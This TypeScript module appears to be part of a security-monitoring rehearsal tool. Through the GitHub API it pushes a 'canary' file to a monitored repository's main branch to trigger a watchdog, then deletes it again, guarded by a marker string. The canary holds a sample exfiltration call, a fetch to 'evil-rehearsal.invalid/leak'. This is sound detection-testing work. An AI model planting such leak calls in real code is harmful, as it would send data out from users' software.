import { Octokit } from "@octokit/rest";
import { getMonitoredRepo } from "./monitored-repo";

/** Marker inside the canary file so revert only removes our rehearsal commits. */
export const BRIDGE_REHEARSAL_MARKER = "BRIDGE_REHEARSAL_CANARY";

const DEFAULT_PATH = "lib/bridge-rehearsal-canary.ts";

function rehearsalPath(): string {
  return process.env.BRIDGE_REHEARSAL_PATH?.trim() || DEFAULT_PATH;
}

function rehearsalBranch(): string {
  return process.env.BRIDGE_REHEARSAL_REF?.trim() || "main";
}

function octokit(): Octokit {
  const auth = process.env.GITHUB_TOKEN?.trim();
  if (!auth) {
    throw new Error(
      "GITHUB_TOKEN is required for git-based rehearsal (repo contents:write)"
    );
  }
  return new Octokit({ auth });
}

function parseRepo(full: string): { owner: string; repo: string } {
  const parts = full.split("/").filter(Boolean);
  if (parts.length < 2) {
    throw new Error(`Invalid MONITORED_REPO: ${full} (expected owner/repo)`);
  }
  return { owner: parts[0]!, repo: parts[1]! };
}

const CANARY_SOURCE = `// ${BRIDGE_REHEARSAL_MARKER} — injected by Bridge rehearsal; safe to delete.
// Triggers structural signals (non-allowlisted https fetch) for webhook-driven watchdog tests.
export async function __bridgeRehearsalLeakProbe(): Promise<void> {
  await fetch("https://evil-rehearsal.invalid/leak");
}
`;

async function getBlobSha(
  client: Octokit,
  owner: string,
  repo: string,
  path: string,
  branch: string
): Promise<string | null> {
  try {
    const { data } = await client.rest.repos.getContent({
      owner,
      repo,
      path,
      ref: branch,
    });
    if (Array.isArray(data) || data.type !== "file") return null;
    return data.sha;
  } catch (e: unknown) {
    const status = typeof e === "object" && e && "status" in e ? (e as { status: number }).status : 0;
    if (status === 404) return null;
    throw e;
  }
}

/** Push a vulnerable-looking canary commit; GitHub webhook should start watchdog. */
export async function injectRehearsalCanary(): Promise<{ sha: string; path: string }> {
  const client = octokit();
  const full = getMonitoredRepo();
  const { owner, repo } = parseRepo(full);
  const path = rehearsalPath();
  const branch = rehearsalBranch();
  const existingSha = await getBlobSha(client, owner, repo, path, branch);

  const { data } = await client.rest.repos.createOrUpdateFileContents({
    owner,
    repo,
    path,
    message:
      "chore: bridge rehearsal — inject canary fetch (revert via Bridge git-rehearsal)",
    content: Buffer.from(CANARY_SOURCE, "utf8").toString("base64"),
    branch,
    ...(existingSha ? { sha: existingSha } : {}),
  });

  const sha = data.commit?.sha;
  if (!sha) {
    throw new Error("GitHub API did not return commit.sha after push");
  }
  return { sha, path };
}

/** Remove the canary file so the next rehearsal can inject again cleanly. */
export async function revertRehearsalCanary(): Promise<{
  sha: string | null;
  path: string;
  noop: boolean;
}> {
  const client = octokit();
  const full = getMonitoredRepo();
  const { owner, repo } = parseRepo(full);
  const path = rehearsalPath();
  const branch = rehearsalBranch();
  const existingSha = await getBlobSha(client, owner, repo, path, branch);
  if (!existingSha) {
    return { sha: null, path, noop: true };
  }

  const { data: raw } = await client.rest.repos.getContent({
    owner,
    repo,
    path,
    ref: branch,
  });
  if (Array.isArray(raw) || raw.type !== "file" || !("content" in raw)) {
    return { sha: null, path, noop: true };
  }
  const text = Buffer.from(raw.content, "base64").toString("utf8");
  if (!text.includes(BRIDGE_REHEARSAL_MARKER)) {
    throw new Error(
      `Refusing to delete ${path}: missing ${BRIDGE_REHEARSAL_MARKER} marker (manual file?)`
    );
  }

  const { data } = await client.rest.repos.deleteFile({
    owner,
    repo,
    path,
    message: "chore: bridge rehearsal — remove canary",
    sha: existingSha,
    branch,
  });

  return { sha: data.commit?.sha ?? null, path, noop: false };
}
